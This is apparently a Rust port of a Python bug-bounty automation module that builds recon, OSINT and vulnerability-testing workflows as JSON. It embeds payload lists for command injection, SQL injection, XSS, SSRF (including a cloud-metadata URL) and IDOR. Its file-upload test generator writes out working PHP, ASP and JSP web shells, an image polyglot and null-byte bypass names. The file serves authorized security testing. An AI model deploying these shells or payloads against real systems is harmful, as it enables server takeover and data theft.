//! Port 1:1 de `hexstrike_server/intelligence/bugbounty.py`.
//!
//! Inventário Python (ordem de definição) — checklist do shard W7.
//! NÃO invente símbolo: o que não está aqui não existe no monólito.
//!
//! ```text
//!    18  class BugBountyTarget:
//!    27  class BugBountyWorkflowManager:
//!   279  class FileUploadTestingFramework:
//!   322  bugbounty_manager = BugBountyWorkflowManager()
//!   323  fileupload_framework = FileUploadTestingFramework()
//! ```

use axum::Router;
use serde_json::{json, Value};
use std::sync::LazyLock;

/// `@dataclass class BugBountyTarget` — "Bug bounty target information".
///
/// Os defaults do `field(default_factory=...)` moram em [`Default`]; as rotas
/// constroem com `..Default::default()`, equivalente 1:1 do `BugBountyTarget(
/// domain=domain, scope=scope, ...)` de keyword args.
pub struct BugBountyTarget {
    pub domain: String,
    // web, api, mobile, iot
    pub program_type: String,
    pub scope: Vec<String>,
    pub out_of_scope: Vec<String>,
    pub priority_vulns: Vec<String>,
    pub bounty_range: String,
}

impl Default for BugBountyTarget {
    fn default() -> Self {
        Self {
            domain: String::new(),
            scope: Vec::new(),
            out_of_scope: Vec::new(),
            program_type: "web".to_string(),
            priority_vulns: ["rce", "sqli", "xss", "idor", "ssrf"]
                .map(str::to_string)
                .to_vec(),
            bounty_range: "unknown".to_string(),
        }
    }
}

/// `class BugBountyWorkflowManager` — "Specialized workflow manager for bug
/// bounty hunting".
pub struct BugBountyWorkflowManager {
    pub high_impact_vulns: Value,
    pub reconnaissance_tools: Value,
}

impl Default for BugBountyWorkflowManager {
    /// `__init__` — os dois dicts de configuração, com as MESMAS chaves.
    fn default() -> Self {
        Self {
            high_impact_vulns: json!({
                "rce": {"priority": 10, "tools": ["nuclei", "jaeles", "sqlmap"], "payloads": "command_injection"},
                "sqli": {"priority": 9, "tools": ["sqlmap", "nuclei"], "payloads": "sql_injection"},
                "ssrf": {"priority": 8, "tools": ["nuclei", "ffuf"], "payloads": "ssrf"},
                "idor": {"priority": 8, "tools": ["arjun", "paramspider", "ffuf"], "payloads": "idor"},
                "xss": {"priority": 7, "tools": ["dalfox", "nuclei"], "payloads": "xss"},
                "lfi": {"priority": 7, "tools": ["ffuf", "nuclei"], "payloads": "lfi"},
                "xxe": {"priority": 6, "tools": ["nuclei"], "payloads": "xxe"},
                "csrf": {"priority": 5, "tools": ["nuclei"], "payloads": "csrf"}
            }),
            reconnaissance_tools: json!([
                {"tool": "amass", "phase": "subdomain_enum", "priority": 1},
                {"tool": "subfinder", "phase": "subdomain_enum", "priority": 2},
                {"tool": "httpx", "phase": "http_probe", "priority": 3},
                {"tool": "katana", "phase": "crawling", "priority": 4},
                {"tool": "gau", "phase": "url_discovery", "priority": 5},
                {"tool": "waybackurls", "phase": "url_discovery", "priority": 6},
                {"tool": "paramspider", "phase": "parameter_discovery", "priority": 7},
                {"tool": "arjun", "phase": "parameter_discovery", "priority": 8}
            ]),
        }
    }
}

impl BugBountyWorkflowManager {
    /// `create_reconnaissance_workflow(target)` — "Create comprehensive
    /// reconnaissance workflow for bug bounty".
    pub fn create_reconnaissance_workflow(&self, target: &BugBountyTarget) -> Value {
        let phases = vec![
            // Phase 1: Subdomain Discovery
            json!({
                "name": "subdomain_discovery",
                "description": "Comprehensive subdomain enumeration",
                "tools": [
                    {"tool": "amass", "params": {"domain": target.domain, "mode": "enum"}},
                    {"tool": "subfinder", "params": {"domain": target.domain, "silent": true}},
                    {"tool": "assetfinder", "params": {"domain": target.domain}}
                ],
                "expected_outputs": ["subdomains.txt"],
                "estimated_time": 300
            }),
            // Phase 2: HTTP Service Discovery
            json!({
                "name": "http_service_discovery",
                "description": "Identify live HTTP services",
                "tools": [
                    {"tool": "httpx", "params": {"probe": true, "tech_detect": true, "status_code": true}},
                    {"tool": "nuclei", "params": {"tags": "tech", "severity": "info"}}
                ],
                "expected_outputs": ["live_hosts.txt", "technologies.json"],
                "estimated_time": 180
            }),
            // Phase 3: Content Discovery
            json!({
                "name": "content_discovery",
                "description": "Discover hidden content and endpoints",
                "tools": [
                    {"tool": "katana", "params": {"depth": 3, "js_crawl": true}},
                    {"tool": "gau", "params": {"include_subs": true}},
                    {"tool": "waybackurls", "params": {}},
                    {"tool": "dirsearch", "params": {"extensions": "php,html,js,txt,json,xml"}}
                ],
                "expected_outputs": ["endpoints.txt", "js_files.txt"],
                "estimated_time": 600
            }),
            // Phase 4: Parameter Discovery
            json!({
                "name": "parameter_discovery",
                "description": "Discover hidden parameters",
                "tools": [
                    {"tool": "paramspider", "params": {"level": 2}},
                    {"tool": "arjun", "params": {"method": "GET,POST", "stable": true}},
                    {"tool": "x8", "params": {"method": "GET"}}
                ],
                "expected_outputs": ["parameters.txt"],
                "estimated_time": 240
            }),
        ];

        // Calculate totals
        let estimated_time: i64 = phases
            .iter()
            .filter_map(|phase| phase.get("estimated_time"))
            .filter_map(Value::as_i64)
            .sum();
        let tools_count: usize = phases
            .iter()
            .filter_map(|phase| phase.get("tools").and_then(Value::as_array))
            .map(|tools| tools.len())
            .sum();

        json!({
            "target": target.domain,
            "phases": phases,
            "estimated_time": estimated_time,
            "tools_count": tools_count
        })
    }

    /// `create_vulnerability_hunting_workflow(target)` — "Create vulnerability
    /// hunting workflow prioritized by impact".
    pub fn create_vulnerability_hunting_workflow(&self, target: &BugBountyTarget) -> Value {
        // Sort vulnerabilities by priority (`sorted(..., reverse=True)` é estável:
        // empate mantém a ordem de `target.priority_vulns`).
        let mut sorted_vulns = target.priority_vulns.clone();
        sorted_vulns.sort_by_key(|vuln| {
            std::cmp::Reverse(self.priority_of(vuln))
        });

        let mut vulnerability_tests: Vec<Value> = Vec::new();
        let mut estimated_time: i64 = 0;
        let mut priority_score: i64 = 0;

        for vuln_type in &sorted_vulns {
            if let Some(vuln_config) = self.high_impact_vulns.get(vuln_type) {
                let priority = self.priority_of(vuln_type);
                let vuln_test = json!({
                    "vulnerability_type": vuln_type,
                    "priority": priority,
                    "tools": vuln_config.get("tools").cloned().unwrap_or(Value::Null),
                    "payload_type": vuln_config.get("payloads").cloned().unwrap_or(Value::Null),
                    "test_scenarios": self._get_test_scenarios(vuln_type),
                    // Higher priority = more time
                    "estimated_time": priority * 30
                });

                estimated_time += priority * 30;
                priority_score += priority;
                vulnerability_tests.push(vuln_test);
            }
        }

        json!({
            "target": target.domain,
            "vulnerability_tests": vulnerability_tests,
            "estimated_time": estimated_time,
            "priority_score": priority_score
        })
    }

    /// `self.high_impact_vulns.get(vuln, {}).get("priority", 0)`
    fn priority_of(&self, vuln_type: &str) -> i64 {
        self.high_impact_vulns
            .get(vuln_type)
            .and_then(|config| config.get("priority"))
            .and_then(Value::as_i64)
            .unwrap_or(0)
    }

    /// `_get_test_scenarios(vuln_type)` — "Get specific test scenarios for
    /// vulnerability types".
    fn _get_test_scenarios(&self, vuln_type: &str) -> Value {
        let scenarios = json!({
            "rce": [
                {"name": "Command Injection", "payloads": ["$(whoami)", "`id`", ";ls -la"]},
                {"name": "Code Injection", "payloads": ["<?php system($_GET['cmd']); ?>"]},
                {"name": "Template Injection", "payloads": ["{{7*7}}", "${7*7}", "#{7*7}"]}
            ],
            "sqli": [
                {"name": "Union-based SQLi", "payloads": ["' UNION SELECT 1,2,3--", "' OR 1=1--"]},
                {"name": "Boolean-based SQLi", "payloads": ["' AND 1=1--", "' AND 1=2--"]},
                {"name": "Time-based SQLi", "payloads": ["'; WAITFOR DELAY '00:00:05'--", "' AND SLEEP(5)--"]}
            ],
            "xss": [
                {"name": "Reflected XSS", "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]},
                {"name": "Stored XSS", "payloads": ["<script>alert('XSS')</script>"]},
                {"name": "DOM XSS", "payloads": ["javascript:alert(1)", "#<script>alert(1)</script>"]}
            ],
            "ssrf": [
                {"name": "Internal Network", "payloads": ["http://127.0.0.1:80", "http://localhost:22"]},
                {"name": "Cloud Metadata", "payloads": ["http://169.254.169.254/latest/meta-data/"]},
                {"name": "DNS Exfiltration", "payloads": ["http://burpcollaborator.net"]}
            ],
            "idor": [
                {"name": "Numeric IDOR", "payloads": ["id=1", "id=2", "id=../1"]},
                {"name": "UUID IDOR", "payloads": ["uuid=00000000-0000-0000-0000-000000000001"]},
                // base64 encoded 1,2
                {"name": "Encoded IDOR", "payloads": ["id=MQ==", "id=Mg=="]}
            ]
        });

        scenarios.get(vuln_type).cloned().unwrap_or_else(|| json!([]))
    }

    /// `create_business_logic_testing_workflow(target)` — "Create business
    /// logic testing workflow".
    pub fn create_business_logic_testing_workflow(&self, target: &BugBountyTarget) -> Value {
        json!({
            "target": target.domain,
            "business_logic_tests": [
                {
                    "category": "Authentication Bypass",
                    "tests": [
                        {"name": "Password Reset Token Reuse", "method": "manual"},
                        {"name": "JWT Algorithm Confusion", "method": "automated", "tool": "jwt_tool"},
                        {"name": "Session Fixation", "method": "manual"},
                        {"name": "OAuth Flow Manipulation", "method": "manual"}
                    ]
                },
                {
                    "category": "Authorization Flaws",
                    "tests": [
                        {"name": "Horizontal Privilege Escalation", "method": "automated", "tool": "arjun"},
                        {"name": "Vertical Privilege Escalation", "method": "manual"},
                        {"name": "Role-based Access Control Bypass", "method": "manual"}
                    ]
                },
                {
                    "category": "Business Process Manipulation",
                    "tests": [
                        {"name": "Race Conditions", "method": "automated", "tool": "race_the_web"},
                        {"name": "Price Manipulation", "method": "manual"},
                        {"name": "Quantity Limits Bypass", "method": "manual"},
                        {"name": "Workflow State Manipulation", "method": "manual"}
                    ]
                },
                {
                    "category": "Input Validation Bypass",
                    "tests": [
                        {"name": "File Upload Restrictions", "method": "automated", "tool": "upload_scanner"},
                        {"name": "Content-Type Bypass", "method": "manual"},
                        {"name": "Size Limit Bypass", "method": "manual"}
                    ]
                }
            ],
            // 8 hours for thorough business logic testing
            "estimated_time": 480,
            "manual_testing_required": true
        })
    }

    /// `create_osint_workflow(target)` — "Create OSINT gathering workflow".
    pub fn create_osint_workflow(&self, target: &BugBountyTarget) -> Value {
        json!({
            "target": target.domain,
            "osint_phases": [
                {
                    "name": "Domain Intelligence",
                    "tools": [
                        {"tool": "whois", "params": {"domain": target.domain}},
                        {"tool": "dnsrecon", "params": {"domain": target.domain}},
                        {"tool": "certificate_transparency", "params": {"domain": target.domain}}
                    ]
                },
                {
                    "name": "Social Media Intelligence",
                    "tools": [
                        {"tool": "sherlock", "params": {"username": "target_company"}},
                        {"tool": "social_mapper", "params": {"company": target.domain}},
                        {"tool": "linkedin_scraper", "params": {"company": target.domain}}
                    ]
                },
                {
                    "name": "Email Intelligence",
                    "tools": [
                        {"tool": "hunter_io", "params": {"domain": target.domain}},
                        {"tool": "haveibeenpwned", "params": {"domain": target.domain}},
                        {"tool": "email_validator", "params": {"domain": target.domain}}
                    ]
                },
                {
                    "name": "Technology Intelligence",
                    "tools": [
                        {"tool": "builtwith", "params": {"domain": target.domain}},
                        {"tool": "wappalyzer", "params": {"domain": target.domain}},
                        {"tool": "shodan", "params": {"query": format!("hostname:{}", target.domain)}}
                    ]
                }
            ],
            "estimated_time": 240,
            "intelligence_types": ["technical", "social", "business", "infrastructure"]
        })
    }
}

/// `class FileUploadTestingFramework` — "Specialized framework for file upload
/// vulnerability testing".
pub struct FileUploadTestingFramework {
    pub malicious_extensions: Vec<&'static str>,
    pub bypass_techniques: Vec<&'static str>,
}

impl Default for FileUploadTestingFramework {
    /// `__init__` — as duas listas, na MESMA ordem.
    fn default() -> Self {
        Self {
            malicious_extensions: vec![
                ".php", ".php3", ".php4", ".php5", ".phtml", ".pht", ".asp", ".aspx", ".jsp",
                ".jspx", ".py", ".rb", ".pl", ".cgi", ".sh", ".bat", ".cmd", ".exe",
            ],
            bypass_techniques: vec![
                "double_extension",
                "null_byte",
                "content_type_spoofing",
                "magic_bytes",
                "case_variation",
                "special_characters",
            ],
        }
    }
}

impl FileUploadTestingFramework {
    /// `generate_test_files()` — "Generate various test files for upload
    /// testing".
    pub fn generate_test_files(&self) -> Value {
        json!({
            "web_shells": [
                {"name": "simple_php_shell.php", "content": "<?php system($_GET['cmd']); ?>"},
                {"name": "asp_shell.asp", "content": "<%eval request(\"cmd\")%>"},
                {"name": "jsp_shell.jsp", "content": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"}
            ],
            "bypass_files": [
                {"name": "shell.php.txt", "technique": "double_extension"},
                {"name": "shell.php%00.txt", "technique": "null_byte"},
                {"name": "shell.PhP", "technique": "case_variation"},
                {"name": "shell.php.", "technique": "trailing_dot"}
            ],
            "polyglot_files": [
                {"name": "polyglot.jpg", "content": "GIF89a<?php system($_GET['cmd']); ?>", "technique": "image_polyglot"}
            ]
        })
    }

    /// `create_upload_testing_workflow(target_url)` — "Create comprehensive
    /// file upload testing workflow".
    pub fn create_upload_testing_workflow(&self, target_url: &str) -> Value {
        json!({
            "target": target_url,
            "test_phases": [
                {
                    "name": "reconnaissance",
                    "description": "Identify upload endpoints",
                    "tools": ["katana", "gau", "paramspider"],
                    "expected_findings": ["upload_forms", "api_endpoints"]
                },
                {
                    "name": "baseline_testing",
                    "description": "Test legitimate file uploads",
                    "test_files": ["image.jpg", "document.pdf", "text.txt"],
                    "observations": ["response_codes", "file_locations", "naming_conventions"]
                },
                {
                    "name": "malicious_upload_testing",
                    "description": "Test malicious file uploads",
                    "test_files": self.generate_test_files(),
                    "bypass_techniques": self.bypass_techniques
                },
                {
                    "name": "post_upload_verification",
                    "description": "Verify uploaded files and test execution",
                    "actions": ["file_access_test", "execution_test", "path_traversal_test"]
                }
            ],
            "estimated_time": 360,
            "risk_level": "high"
        })
    }
}

// Global bug bounty workflow manager
#[allow(non_upper_case_globals)]
pub static bugbounty_manager: LazyLock<BugBountyWorkflowManager> =
    LazyLock::new(BugBountyWorkflowManager::default);

#[allow(non_upper_case_globals)]
pub static fileupload_framework: LazyLock<FileUploadTestingFramework> =
    LazyLock::new(FileUploadTestingFramework::default);

/// Rotas registradas neste módulo. O Python registra no import
/// (`@app.route`); aqui a montagem é explícita e na MESMA ordem de
/// `hexstrike_server/__init__.py`.
pub fn routes() -> Router {
    Router::new()
}
